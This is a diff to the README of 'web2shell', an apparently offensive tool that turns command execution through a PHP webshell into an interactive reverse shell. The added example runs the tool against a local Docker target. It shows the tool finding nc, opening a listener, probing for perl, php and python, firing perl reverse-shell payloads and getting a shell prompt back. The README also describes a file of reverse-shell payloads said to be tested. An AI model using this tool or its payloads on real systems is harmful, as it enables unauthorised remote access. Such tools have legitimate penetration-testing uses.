@@ -35,3 +35,52 @@ The included payloads have all been tested on a simple webshell and work. If you
 - Edit the `data/payloads.py` file.
 - Add a new object to the `payloads` dict. The `key` should be the name of the bin, and the value should be a `list` object of payloads.
 - Replace all instances of the reverse `IP` with `IPHERE`, the port with `PORTHERE`, and the binary name with `PATHHERE`.
+
+## Example
+
+Example execution on local Docker image (see `demo/README.md`)
+
+```
+[evan@ejedev web2shell]$ python3 web2shell.py  --url http://127.0.0.1:8080/cmd.php?cmd=SHELL --interface docker0
+
+               o                  o           o  o
+               O     .oOOo.       O           O  O
+               O          O       o           o  o
+               o          o       O           O  O
+'o     O .oOo. OoOo.     O' .oOo  OoOo. .oOo. o  o
+ O  o  o OooO' O   o    O   `Ooo. o   o OooO' O  O
+ o  O  O O     o   O  .O        O o   O O     o  o
+ `Oo'oO' `OoO' `OoO' oOoOoO `OoO' O   o `OoO' Oo Oo
+---------------------------------------------------
+                      @ejedev
+
+Verifying commands can be executed...
+Available interfaces...
+[-] lo
+[-] enp4s0
+[-] docker0
+[-] br-7436527ee366
+[-] br-aa3534e13396
+[-] br-c7551daa06d2
+[-] veth87ee241
+docker0 selected. Address to use is 172.17.0.1
+Testing ports...
+[-] 1025 available!
+Finding local nc binary...
+nc target at /usr/bin/nc
+Final connection string will be 172.17.0.1:1025...
+Finding bins...
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1025
+Ncat: Listening on 0.0.0.0:1025
+[-] perl found at /usr/bin/perl
+[-] perl found at /usr/bin/perl5.32-x86_64-linux-gnu
+[-] php found at /usr/local/bin/php
+[-] python found at /usr/bin/python3.9
+Executing reverse shell...
+Bins to test: 4
+[!] Attempting perl payloads for path /usr/bin/perl
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:54256.
+$
+```
